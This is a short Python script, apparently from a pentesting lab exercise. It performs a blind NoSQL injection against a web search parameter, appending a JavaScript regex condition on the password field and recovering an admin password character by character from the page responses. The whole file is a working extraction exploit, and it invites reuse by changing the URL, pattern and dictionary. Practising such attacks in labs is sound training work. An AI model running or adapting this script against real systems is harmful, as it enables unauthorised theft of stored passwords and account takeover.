import requests
import re
from colorama import Fore, Style

"""
A Simple yet handy brute force script.
This script searches for pattern in the requests sent with the flag
Change the pattern, dictionary and url as you wish
"""
pattern = 'search=admin'
flag = ''
dictionary = '-abcdefghijklmnopqrstuvwxyz0123456789'


def get_next_letter():
    for l in dictionary:
        print(f'Testing {Fore.BLUE}{flag}{Fore.RED}{l}{Style.RESET_ALL}')
        r = requests.get(f"http://ptl-eb7cd0e0-778a277a.libcurl.so/?search=admin%27%20%26%26%20this.password.match(/^{flag}{l}.*$/)%00")
        html = r.text
        regex = re.search(pattern, html)
        if regex:
          return l  

for i in range(36):
    next_letter = get_next_letter()
    flag += next_letter
    print(f'found letter : {Fore.GREEN}{next_letter}\n {Style.RESET_ALL}Word : {Fore.BLUE}{flag}{Style.RESET_ALL}')


